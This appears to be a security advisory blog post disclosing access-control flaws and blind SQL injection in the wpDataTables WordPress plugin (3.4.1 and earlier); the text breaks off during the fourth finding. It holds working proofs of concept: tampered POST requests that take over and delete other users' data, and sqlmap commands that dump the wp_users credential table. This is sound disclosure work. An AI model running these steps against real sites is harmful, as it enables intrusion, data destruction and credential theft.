@@ -1,0 +1,627 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>WordPress Plugin wpDataTables - Multiple Vulnerabilities - The Tales of N4nj0</title>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="The HTML5 Herald" />
+<meta name="author" content="Veno Eivazian" /><meta property="og:title" content="WordPress Plugin wpDataTables - Multiple Vulnerabilities" />
+<meta property="og:description" content="TL;DR Me and my colleague Massimiliano Ferraresi have found four security issues:
+1 - Improper Access Control: An authenticated user that visits the page where the table is published can tamper the parameters to access the data of another user that are present in the same table by taking over the user permissions on the table through formdata[wdt_ID] parameter.
+2 - Improper Access Control: An authenticated user that visits the page where the table is published can tamper the parameters to delete the data of another user that are present in the same table through id_key and id_val parameters." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-ii/" />
+<meta property="article:published_time" content="2021-03-16T17:15:00&#43;01:00"/>
+<meta property="article:modified_time" content="2021-03-16T17:15:00&#43;01:00"/>
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WordPress Plugin wpDataTables - Multiple Vulnerabilities"/>
+<meta name="twitter:description" content="TL;DR Me and my colleague Massimiliano Ferraresi have found four security issues:
+1 - Improper Access Control: An authenticated user that visits the page where the table is published can tamper the parameters to access the data of another user that are present in the same table by taking over the user permissions on the table through formdata[wdt_ID] parameter.
+2 - Improper Access Control: An authenticated user that visits the page where the table is published can tamper the parameters to delete the data of another user that are present in the same table through id_key and id_val parameters."/>
+
+<meta name="generator" content="Hugo 0.54.0" />
+    
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://n4nj0.github.io/fontawesome/css/all.min.css" />
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  
+  
+  <link rel="stylesheet" type="text/css" href="/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="/">The Tales of N4nj0</a>
+            </h1>
+
+      <ul id="social-media">
+             <li>
+               <a href="https://github.com/n4nj0" title="GitHub">
+               <i class="fab fa-github fa-lg"></i>
+               </a>
+             </li>
+             <li>
+               <a href="https://linkedin.com/in/venoeivazian" title="LinkedIn">
+               <i class="fab fa-linkedin fa-lg"></i>
+               </a>
+             </li>
+      </ul>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="active" href="/advisories/">
+                <i class="fa-li fa  fa-lg"></i><span>Advisories</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/whoami/">
+                <i class="fa-li fa  fa-lg"></i><span>whoami</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>WordPress Plugin wpDataTables - Multiple Vulnerabilities</h1>
+
+    
+      <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2021-03-16T17:15:00&#43;01:00">Mar 16, 2021</time>
+        </li>
+        
+        
+
+        
+
+        <li>13 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    
+<div class="featured_image">
+    <a href="https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-ii/" title="WordPress Plugin wpDataTables - Multiple Vulnerabilities">
+        <img src="">
+    </a>
+</div>
+
+
+
+    
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<p>Me and my colleague Massimiliano Ferraresi have found four security issues:</p>
+
+<p><strong>1 - Improper Access Control</strong>: An authenticated user that visits the page where the table is published can tamper the parameters to access the data of another user that are present in the same table by taking over the user permissions on the table through <strong>formdata[wdt_ID]</strong> parameter.<br />
+<strong>2 - Improper Access Control</strong>: An authenticated user that visits the page where the table is published can tamper the parameters to delete the data of another user that are present in the same table through <strong>id_key</strong> and <strong>id_val</strong> parameters.<br />
+<strong>3 - SQL Injection</strong>: An authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter <strong>start</strong>.<br />
+<strong>4 - SQL Injection</strong>: An authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter <strong>length</strong>.</p>
+
+<h2 id="plugin-information">Plugin Information</h2>
+
+<ul>
+<li><strong>Organization Name:</strong> TMS</li>
+<li><strong>Web Page:</strong> <a href="https://tms-outsource.com">https://tms-outsource.com</a></li>
+<li><strong>Vulnerability Disclosure Info or Technical Support Web Page:</strong> <a href="https://tmsplugins.ticksy.com/submit/#100004195">https://tmsplugins.ticksy.com/submit/#100004195</a></li>
+<li><strong>Plugin name:</strong> wpDataTables</li>
+<li><strong>Plugin version:</strong> &lt;= 3.4.1</li>
+<li><strong>Plugin Web Page:</strong> <a href="https://wpdatatables.com">https://wpdatatables.com</a></li>
+</ul>
+
+<p>wpDataTables is a best-selling WordPress table plugin which makes very easy to work with tables, charts and data management. It is currently used by 40,000+ companies and individuals in financial, scientific, statistical, commercial and other sectors.</p>
+
+<p>During another security auditing of the product, we have found four security issues. The first two are broken access controls on accessing and deleting data on the same table. Also, the other two are Blind SQL Injections on 2 different parameters.</p>
+
+<p>The fix was developed with the release 3.4.2, 16 days after our vulnerability disclosure. This time they didn&rsquo;t mention us, maybe we have created some troubles for them. For all folks of wpDataTables Team, no problem for us, the important thing is to collaborate and make the products more secure as possible. See you soon 😘</p>
+
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+
+<h3 id="1-software-does-not-restrict-or-incorrectly-restricts-access-to-a-resource-from-an-unauthorized-actor-cwe-284"><strong>1 - Software does not restrict or incorrectly restricts access to a resource from an unauthorized actor - CWE-284</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An authenticated user can tamper HTTP parameters to access to the data on the table of another user by taking over the user permissions on the table.</li>
+<li><strong>Prerequisites:</strong> A simple table with the settings of <em>Enable of front-end editing</em> and <em>Limiting editing to own data only</em> needs to be created and published in a page on WordPress.</li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>First, it is necessary to create a simple table with three columns and two or more rows. Then, the table can be published on a page with the following settings:
+* Allow front-end editing
+* Limit editing to own data only</p>
+
+<p>An authenticated user that visits the page where the table is published can tamper the parameters to access the data of another user that are present in the same table through <strong>formdata[wdt_ID]</strong> parameter.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/portal/wp-admin/admin-ajax.php">http://hostname/portal/wp-admin/admin-ajax.php</a></li>
+<li><strong>HTTP Parameter:</strong> formdata[wdt_ID]</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.</p>
+
+<p>To create the table, login to WordPress as <strong>admin</strong>.<br />
+Under <strong>wpDataTables</strong> -&gt; <strong>Create a Table</strong>, select <strong>Create a data table manually</strong> and then <strong>Next</strong>.</p>
+
+<p><img src="/images/18057ef8f7a7d086bfbe9ee37ac9e46a.png" alt="Creation of the table" /></p>
+
+<p>The table can have simple data, like the following:
+* <strong>Table name:</strong> products
+* <strong>Number of columns:</strong> 3
+* <strong>Column 1:</strong>
+  * <strong>Name:</strong> name
+  * <strong>Type:</strong> One line string
+* <strong>Column 2:</strong>
+  * <strong>Name:</strong> price
+  * <strong>Type:</strong> Float
+* <strong>Column 3</strong> (<strong>The User ID column is responsible to manage the user’s authorizations</strong>);
+  * <strong>Name:</strong> User ID
+  * <strong>Type:</strong> Integer</p>
+
+<p>Add the table data via the web interface:</p>
+
+<p>Confirm the table with <strong>Create the table</strong> -&gt; <strong>Open in Standard view</strong><br />
+Insert three rows with some data, in the userid column is necessary to insert the ID of WordPress users.
+For PoC we registered two users <strong>max (id=1)</strong> and <strong>test (id=2)</strong></p>
+
+<p><img src="/images/7df23ef50e2a15feee5a28014d30e48b.png" alt="Insert value" />
+Under <strong>Editing</strong> click on  <strong>Allow front-end editing</strong> and on <strong>Limiting editing to own data only</strong>.
+After this operation under the <strong>User ID column</strong> select <strong>userid</strong> like the image below:</p>
+
+<p><img src="/images/3ca0fb56ffef3ad944d867967fee4810.png" alt="Set the permission" /></p>
+
+<p>In this way the plugin can show the data depending on the userid value.<br />
+To publish the table it is necessary to copy its shortcode on the home page.</p>
+
+<p><img src="/images/f2932527ad601b36a33ae845c1c28269.png" alt="Insert shortcode)" /></p>
+
+<p>Login through WordPress with the user <strong>test</strong> (id=2), then go on the page <a href="http://hostname/home/">http://hostname/home/</a> and the table will show only the record for this specific user:</p>
+
+<p><img src="/images/84314e1bdd8d297f4beea5dc7086e7a2.png" alt="Data test user" /></p>
+
+<p>Click on <strong>New Entry</strong> and add new record on the table:</p>
+
+<p><img src="/images/d9720d29c5d93a18d1177a8cb8cac88a.png" alt="Add new entry" /></p>
+
+<p>With the HTTP Proxy like Burp Suite intercept the request for adding a new record:</p>
+
+<p><img src="/images/d067598b38be92e2e64343ce04a37d25.png" alt="Burp - Add request" /></p>
+
+<p>This is the intercepted request:</p>
+
+<pre><code>POST /portal/wp-admin/admin-ajax.php HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://hostname/portal/home/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 175
+DNT: 1
+Connection: close
+Cookie: [REDACTED]
+
+action=wdt_save_table_frontend&amp;wdtNonce=55f87706c7&amp;formdata%5Btable_id%5D=19&amp;formdata%5Bwdt_ID%5D=&amp;formdata%5Bname%5D=arduino&amp;formdata%5Bprice%5D=10%2C00&amp;formdata%5Buserid%5D=
+</code></pre>
+
+<p>For exploiting this vulnerability is necessary to change the value of <strong>formdata[wdt_ID]</strong> to <strong>1</strong> and then <strong>delete</strong> the following fields from the HTTP request:</p>
+
+<pre><code>formdata%5Bname%5D=arduino&amp;formdata%5Bprice%5D=10%2C00&amp;formdata%5Buserid%5D=
+</code></pre>
+
+<p>The new HTTP request to change the permission on the table will be like the following:</p>
+
+<pre><code>POST /portal/wp-admin/admin-ajax.php HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://hostname/portal/home/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 175
+DNT: 1
+Connection: close
+Cookie: [REDACTED]
+
+action=wdt_save_table_frontend&amp;wdtNonce=55f87706c7&amp;formdata%5Btable_id%5D=19&amp;formdata%5Bwdt_ID%5D=1
+</code></pre>
+
+<p>The image below shows the correct request/response received from the server:</p>
+
+<p><img src="/images/d66af867b83529996f13244d61e4e3e9.png" alt="Burp - Modified request" /></p>
+
+<p>In this way with the user <strong>test</strong> (id=2) we are able to overwrite the value of <strong>userid</strong> and then we can view and manage the data of the user <strong>max</strong> (id=1), as depicted by the following screenshot:</p>
+
+<p><img src="/images/1156cfd5ab5d2e0e009e34746e2b83ff.png" alt="Takeover of data permissions" /></p>
+
+<p>The vulnerability is tested on wpDataTables version 3.4.1:</p>
+
+<p><img src="/images/db81e4598a66e10e267854e00bb9451a.png" alt="Vulnerable version confirmation - wpDataTables 3.4.1" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to access and manage the data of all users in the same table.</p>
+
+<h3 id="2-software-does-not-restrict-or-incorrectly-restricts-access-to-a-resource-from-an-unauthorized-actor-cwe-284"><strong>2 - Software does not restrict or incorrectly restricts access to a resource from an unauthorized actor - CWE-284</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An authenticated user can tamper HTTP parameters to delete the data in the table of another user.</li>
+<li><strong>Prerequisites:</strong> A simple table with the settings of <em>Enable of front-end editing</em> and <em>Limiting editing to own data only</em> needs to be created and published in a page on WordPress.</li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>First, it is necessary to create a simple table with three columns and two or more rows. Then, the table can be published on a page with the following settings:
+* Allow front-end editing
+* Limit editing to own data only</p>
+
+<p>An authenticated user that visits the page where the table is published can tamper the parameters to delete the data of another user that are present in the same table through <strong>id_key</strong> and <strong>id_val</strong> parameters.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/portal/wp-admin/admin-ajax.php">http://hostname/portal/wp-admin/admin-ajax.php</a></li>
+<li><strong>HTTP Parameters:</strong> id_key and id_val</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.</p>
+
+<p>To create the table, use the same steps of the previous vulnerability.</p>
+
+<p>Login through WordPress with the user <strong>test</strong> (id=2), then go on the page <a href="http://hostname/home/">http://hostname/home/</a> and the table will show only the record for this specific user:</p>
+
+<p><img src="/images/975efdcb8dd74d7e8f3a0814d49778b2.png" alt="Data test user" /></p>
+
+<p>Click on <strong>Delete</strong> and delete the record on the table:</p>
+
+<p><img src="/images/353bc131e133f8c4df7a757d0bcdc626.png" alt="Delete entry" /></p>
+
+<p>With the HTTP Proxy like Burp Suite intercept the request for deleting the record:</p>
+
+<p><img src="/images/d03be370d81cc7d36c3a49111206becb.png" alt="Burp - Add request" /></p>
+
+<p>This is the intercepted request:</p>
+
+<pre><code>POST /portal/wp-admin/admin-ajax.php HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://hostname/portal/home/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 175
+DNT: 1
+Connection: close
+Cookie: [REDACTED]
+
+action=wdt_delete_table_row&amp;id_key=wdt_ID&amp;id_val=2&amp;table_id=21&amp;wdtNonce=2fe2c28b36
+</code></pre>
+
+<p>For exploiting this vulnerability is necessary to change the value of <strong>id_key</strong> to <strong>userid</strong> and the <strong>id_val</strong> to <strong>1</strong>:</p>
+
+<pre><code>action=wdt_delete_table_row&amp;id_key=userid&amp;id_val=1&amp;table_id=21&amp;wdtNonce=2fe2c28b36
+</code></pre>
+
+<p>The new HTTP request to change the permission on the table will be like the following:</p>
+
+<pre><code>POST /portal/wp-admin/admin-ajax.php HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://hostname/portal/home/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 175
+DNT: 1
+Connection: close
+Cookie: [REDACTED]
+
+action=wdt_delete_table_row&amp;id_key=userid&amp;id_val=1&amp;table_id=21&amp;wdtNonce=2fe2c28b36
+</code></pre>
+
+<p>The image below shows the correct request/response received from the server:</p>
+
+<p><img src="/images/2641b133c3513e672dd4c2f2bcaf59b1.png" alt="Burp - Modified request" /></p>
+
+<p>In this way with the user <strong>test</strong> (id=2) we are able to delete all the values of the user <strong>max</strong> (id=1), as depicted by the following screenshot:</p>
+
+<p><img src="/images/71682a7f29ebc9c26d52791ed34c16e6.png" alt="Takeover of data permissions" /></p>
+
+<p>The vulnerability is tested on wpDataTables version 3.4.1:</p>
+
+<p><img src="/images/db81e4598a66e10e267854e00bb9451a.png" alt="Vulnerable version confirmation - wpDataTables 3.4.1" /></p>
+
+<p><strong>Important Note</strong></p>
+
+<p>In the <strong>id_key</strong> parameter it is possible to insert any column name that are presents in the table (<em>string</em> datatype).</p>
+
+<p>The <strong>id_val</strong> parameter supports only <em>int</em> and <em>float</em> datatype.</p>
+
+<p>So, with these parameters it is possible to delete all records in the database that respect this condition, because of the query in the code that is similar to the following:</p>
+
+<pre><code>DELETE FROM wp_wpdatatable_19 WHERE id_key=id_val -- id_val is datatype int or float;
+</code></pre>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to delete the data of all users in the same table.</p>
+
+<h3 id="3-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89"><strong>3 - Improper Neutralization of Special Elements used in an SQL Command (&lsquo;SQL Injection&rsquo;) - CWE-89</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An authenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the WordPress application.</li>
+<li><strong>Prerequisites:</strong> WordPress account. Also, a simple table with default settings needs to be created via the web interface.</li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>First, it is necessary to create a simple table with two columns and two rows. Then, an authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter <strong>start</strong>.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1">http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1</a></li>
+<li><strong>HTTP Parameter:</strong> start</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.</p>
+
+<p>To create the table, login to WordPress as <strong>admin</strong>.<br />
+Under <strong>wpDataTables</strong> -&gt; <strong>Create a Table</strong>, select <strong>Create a data table manually</strong> and then <strong>Next</strong>.</p>
+
+<p><img src="/images/18057ef8f7a7d086bfbe9ee37ac9e46a.png" alt="Creation of the table (1)" /></p>
+
+<p>The table can have simple data, like the following:
+* <strong>Table name:</strong> products
+* <strong>Number of columns:</strong> 2
+* <strong>Column 1:</strong>
+  * <strong>Name:</strong> name
+  * <strong>Type:</strong> One line string
+* <strong>Column 2:</strong>
+  * <strong>Name:</strong> price
+  * <strong>Type:</strong> Integer</p>
+
+<p>Add the table data via the web interface:</p>
+
+<p><img src="/images/26aa9c7f9d8767ad9db0cf57f1eafd6d.png" alt="Creation of the table (2)" /></p>
+
+<p>Confirm the table with <strong>Create the table</strong> -&gt; <strong>Open in Excel-like editor</strong><br />
+Insert two rows with some data , like the following picture, then confirm with <strong>Save Changes</strong>:</p>
+
+<p><img src="/images/0a4a1693d5639add992b75de562cb4b1.png" alt="Creation of the table (3)" /></p>
+
+<p>Re-login or leave the authenticated session.<br />
+On thew WordPress administrative page, under <strong>Dashboard</strong>, select <strong>wpDataTables</strong> menu:</p>
+
+<p><img src="/images/7f49b4b013dd1e1caf3c7cb01067d130.png" alt="Selection of the table (1)" /></p>
+
+<p>Select the table name, <strong>products</strong> in this case.</p>
+
+<p><img src="/images/c1284d760c77acce1a1bb6e0ed59db81.png" alt="Selection of the table (2)" /></p>
+
+<p>Intercept the browser session with a proxy like <a href="https://portswigger.net/burp"><strong>Burp Suite</strong></a>.<br />
+The HTTP POST request will be like the following:</p>
+
+<p><img src="/images/9b599e15ce7b9a362394be5a93a22527.png" alt="Burp - Selection of the table" /></p>
+
+<p>Copy the intercepted request, and paste the content a text file named <code>draw.txt</code>, similar to the following one:</p>
+
+<pre><code>POST /wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1 HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://hostname/wp-admin/admin.php?page=wpdatatables-constructor&amp;source&amp;table_id=1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 1044
+Origin: http://hostname
+Connection: close
+Cookie: wordpress_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C69fdaaf35f2fea0cfe3ff830a3917370ed5dc49b4637c1945177e57d6228703e; wpsc_ticket_filter=%7B%22label%22%3A%22unresolved_agent%22%2C%22query%22%3A%5B%7B%22key%22%3A%22ticket_status%22%2C%22value%22%3A%5B3%2C4%2C5%5D%2C%22compare%22%3A%22IN%22%7D%5D%2C%22orderby%22%3A%22date_updated%22%2C%22order%22%3A%22DESC%22%2C%22page%22%3A1%2C%22custom_filter%22%3A%7B%22s%22%3A%22%22%7D%7D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C1aa7b20915d029cb8a392b0ad91edf1b3d1660efd91dff46e513a372e4b855a2; wp-settings-1=libraryContent%3Dbrowse%26mfold%3Do; wp-settings-time-1=1613403295
+
+draw=1&amp;columns%5B0%5D%5Bdata%5D=0&amp;columns%5B0%5D%5Bname%5D=wdt_ID&amp;columns%5B0%5D%5Bsearchable%5D=true&amp;columns%5B0%5D%5Borderable%5D=true&amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B1%5D%5Bdata%5D=1&amp;columns%5B1%5D%5Bname%5D=name&amp;columns%5B1%5D%5Bsearchable%5D=true&amp;columns%5B1%5D%5Borderable%5D=true&amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B2%5D%5Bdata%5D=2&amp;columns%5B2%5D%5Bname%5D=price&amp;columns%5B2%5D%5Bsearchable%5D=true&amp;columns%5B2%5D%5Borderable%5D=true&amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&amp;order%5B0%5D%5Bcolumn%5D=0&amp;order%5B0%5D%5Bdir%5D=asc&amp;start=0&amp;length=10&amp;search%5Bvalue%5D=&amp;search%5Bregex%5D=false&amp;currentUserId=1&amp;currentUserLogin=admin&amp;currentPostIdPlaceholder=&amp;currentUserFirstName=&amp;currentUserLastName=&amp;currentUserEmail=test%40mail.com&amp;currentDate=15%2F02%2F2021&amp;currentDateTime=15%2F02%2F2021+03%3A40+PM&amp;currentTime=03%3A40+PM&amp;wpdbPlaceholder=wp_&amp;wdtNonce=7a0d38fc5e&amp;showAllRows=on
+</code></pre>
+
+<p>Then, use the <a href="http://sqlmap.org"><strong>SQLMap</strong></a> tool to exploit the vulnerability with the following command:</p>
+
+<pre><code># Clear SQLMap local cache:
+rm -rf ~/.local/share/sqlmap
+sqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql --banner -p start --batch
+</code></pre>
+
+<p>The banner of the database is gathered as PoC of the vulnerability:</p>
+
+<p><img src="/images/54ce2183472c83baaf01c211edbaad4c.png" alt="SQLMap - Banner" /></p>
+
+<p>It is possible to dump all the WordPress database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the WordPress admin page.<br />
+To extract the <strong>wp_users</strong> table, use the following command:</p>
+
+<pre><code>sqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql -p start -D wordpress -T wp_users --dump
+</code></pre>
+
+<p><img src="/images/bb8700cb2976763ed35c778acc659f0e.png" alt="SQLMap - Database dump" /></p>
+
+<p>The vulnerability is tested on wpDataTables version 3.4.1, as depicted by the following screenshot:</p>
+
+<p><img src="/images/db81e4598a66e10e267854e00bb9451a.png" alt="Vulnerable version confirmation - wpDataTables 3.4.1" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to access all the data in the database and obtain access to the WordPress application, because all the data, including WordPress credentials, can be extracted and cracked.<br />
+It is important to note that a valid WordPress administrator account is also able to execute Remote Code Execution attack because of the capability of installing or modifying existing plugins or themes via the web interface. This scenario allows the entire compromise of the target operating system where wpDataTables is installed.</p>
+
+<h3 id="4-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89"><strong>4 - Improper Neutralization of Special Elements used in an SQL Command (&lsquo;SQL Injection&rsquo;) - CWE-89</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An authenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the WordPress application.</li>
+<li><strong>Prerequisites:</strong> WordPress account. Also, a simple table with default settings needs to be created via the web interface.</li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>First, it is necessary to create a simple table with two columns and two rows. Then, an authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter <strong>length</strong>.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1">http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1</a></li>
+<li><strong>HTTP Parameter:</strong> length</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.</p>
+
+<p>To create the table, use the same steps of the previous vulnerability.</p>
+
+<p>Re-login or leave the authenticated session.<br />
+On thew WordPress administrative page, under <strong>Dashboard</strong>, select <strong>wpDataTables</strong> menu:</p>
+
+<p><img src="/images/7f49b4b013dd1e1caf3c7cb01067d130.png" alt="Selection of the table (1)" /></p>
+
+<p>Select the table name, <strong>products</strong> in this case.</p>
+
+<p><img src="/images/c1284d760c77acce1a1bb6e0ed59db81.png" alt="Selection of the table (2)" /></p>
+
+<p>Intercept the browser session with a proxy like <a href="https://portswigger.net/burp"><strong>Burp Suite</strong></a>.<br />
+The HTTP POST request will be like the following:</p>
+
+<p><img src="/images/9b599e15ce7b9a362394be5a93a22527.png" alt="Burp - Selection of the table" /></p>
+
+<p>Copy the intercepted request, and paste the content a text file named <code>draw.txt</code>, similar to the following one:</p>
+
+<pre><code>POST /wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1 HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://hostname/wp-admin/admin.php?page=wpdatatables-constructor&amp;source&amp;table_id=1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 1044
+Origin: http://hostname
+Connection: close
+Cookie: wordpress_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C69fdaaf35f2fea0cfe3ff830a3917370ed5dc49b4637c1945177e57d6228703e; wpsc_ticket_filter=%7B%22label%22%3A%22unresolved_agent%22%2C%22query%22%3A%5B%7B%22key%22%3A%22ticket_status%22%2C%22value%22%3A%5B3%2C4%2C5%5D%2C%22compare%22%3A%22IN%22%7D%5D%2C%22orderby%22%3A%22date_updated%22%2C%22order%22%3A%22DESC%22%2C%22page%22%3A1%2C%22custom_filter%22%3A%7B%22s%22%3A%22%22%7D%7D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C1aa7b20915d029cb8a392b0ad91edf1b3d1660efd91dff46e513a372e4b855a2; wp-settings-1=libraryContent%3Dbrowse%26mfold%3Do; wp-settings-time-1=1613403295
+
